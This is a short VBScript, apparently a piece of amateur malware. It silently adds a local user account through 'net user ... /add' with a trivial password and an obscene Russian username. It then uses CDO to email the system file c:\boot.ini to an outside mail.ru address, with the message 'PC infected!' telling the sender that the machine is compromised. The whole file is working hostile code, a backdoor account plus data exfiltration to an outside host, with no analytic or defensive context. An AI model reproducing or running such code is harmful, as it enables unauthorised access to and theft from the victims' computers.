on error resume next
Set S = CreateObject("Wscript.Shell")
set FSO=createobject("scripting.filesystemobject")
s.run"net user Головка от ХуЯ ! 123 /add",0
Call SendPost("smtp.mail.ru","reciever@mail.ru","sender@mail.ru","Kuzja","Копм заражен!")
Function SendPost(strSMTP_Server,strTo,strFrom,strSubject,strBody)
Set iMsg=CreateObject("CDO.Message")
Set iConf=CreateObject("CDO.Configuration")
Set Flds=iConf.Fields
Flds.Item("http://schemas.microsoft.com/cdo/configuration/sendusing")=2
Flds.Item("http://schemas.microsoft.com/cdo/configuration/smtpauthenticate")=1
Flds.Item("http://schemas.microsoft.com/cdo/configuration/sendusername")="sender"
Flds.Item("http://schemas.microsoft.com/cdo/configuration/sendpassword")="password"
Flds.Item("http://schemas.microsoft.com/cdo/configuration/smtpserver")="smtp.mail.ru"
Flds.Item("http://schemas.microsoft.com/cdo/configuration/smtpserverport")=25
Flds.Update
iMsg.Configuration=iConf
iMsg.To=strTo
iMsg.From=strFrom
iMsg.Subject=strSubject
iMsg.TextBody=strBody
iMsg.AddAttachment "c:\boot.ini" 
iMsg.Send
End Function
Set iMsg=Nothing
Set iConf=Nothing
Set Flds=Nothing


